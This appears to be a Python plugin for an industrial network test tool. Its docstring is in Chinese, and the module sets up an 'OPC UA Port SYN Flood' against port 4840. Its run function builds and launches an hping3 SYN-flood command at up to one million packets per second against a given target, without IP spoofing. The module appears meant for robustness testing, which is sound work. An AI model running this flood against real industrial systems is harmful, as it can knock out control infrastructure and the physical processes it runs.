"""
測項：OPC UA Port 巨量 SYN Flood
分類：OPC UA（預設埠 4840）
底層工具：hping3（不加 --rand-source，一律使用攻擊端本機真實來源 IP，不做 IP Spoofing；
         註：generic/tcp_syn_flood.py 目前已改為原生 scapy 實作、不再經由 hping3，
         此處仍沿用 hping3 subprocess 作法，安全限制與速率控制邏輯相同，僅底層工具不同）
"""
from ..common import run_subprocess, clamp_duration

NAME = "OPC UA Port SYN Flood"
CATEGORY = "OPC UA"
PROTOCOL = "TCP"
DEFAULT_PORT = 4840
TEST_TYPE = "traffic"  # 流量型：以封包速率衝擊目標 Port 的 SYN flood


def get_param_schema() -> dict:
    return {
        "rate_pps": {"type": "int", "default": 1000000, "min": 1, "max": 1000000, "desc": "--rate"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_pps", 5000))
    interval_us = max(1, int(1_000_000 / rate))
    count = rate * duration

    cmd = ["hping3", "-S", "-q", "-p", str(port), "-i", f"u{interval_us}", "-c", str(count), target]
    return run_subprocess(cmd, duration + 10, stop_event, log_fn)
